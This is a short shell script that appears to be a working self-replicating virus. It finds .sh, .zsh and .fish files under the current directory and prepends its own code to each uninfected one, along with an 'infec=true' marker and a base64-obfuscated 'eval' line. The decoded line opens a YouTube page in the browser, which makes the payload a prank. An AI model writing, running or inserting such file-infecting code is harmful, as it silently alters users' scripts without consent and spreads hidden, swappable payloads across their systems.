infec=true



#!/bin/sh
function append() {
    file=$1
    awk -i inplace 'BEGINFILE{print""}{print}' $file
    awk -i inplace 'BEGINFILE{print"eval $(echo \"cHl0aG9uIC1jICJpbXBvcnQgd2ViYnJvd3Nlcjsgd2ViYnJvd3Nlci5vcGVuKFwiaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUVwiKSIK\" | base64 -d)"}{print}' $file
    awk -i inplace 'BEGINFILE{print"#!/bin/sh"}{print}' $file
    awk -i inplace 'BEGINFILE{print"infec=true"}{print}' $file
}
function inf() {
    shellfiles=$(find . -type f -name '*.sh')
    zshfiles=$(find . -type f -name "*.zsh")
    fishfiles=$(find . -type f -name "*.fish")
    for file in $shellfiles; do
        if ! sed -n '1p' $file | grep "infec=true" > /dev/null; then
            file="$(pwd)${file:1}"
            this=$(echo $0 )
            this=$(echo ${this##*/})
            awk 'NR>=5&&NR<=45' $this | cat - $file > temp && mv temp $file
            append $file
        fi
    done
    for file in $zshfiles; do
        if ! sed -n '1p' $file | grep "infec=true" > /dev/null; then
            file="$(pwd)${file:1}"
            this=$(echo $0 )
            this=$(echo ${this##*/})
            awk 'NR>=5&&NR<=45' $this | cat - $file > temp && mv temp $file
            append $file
        fi
    done
    for file in $fishfiles; do
        if ! sed -n '1p' $file | grep "infec=true" > /dev/null; then
            file="$(pwd)${file:1}"
            this=$(echo $0 )
            this=$(echo ${this##*/})
            awk 'NR>=5&&NR<=45' $this | cat - $file > temp && mv temp $file
            append $file
        fi
    done
}
inf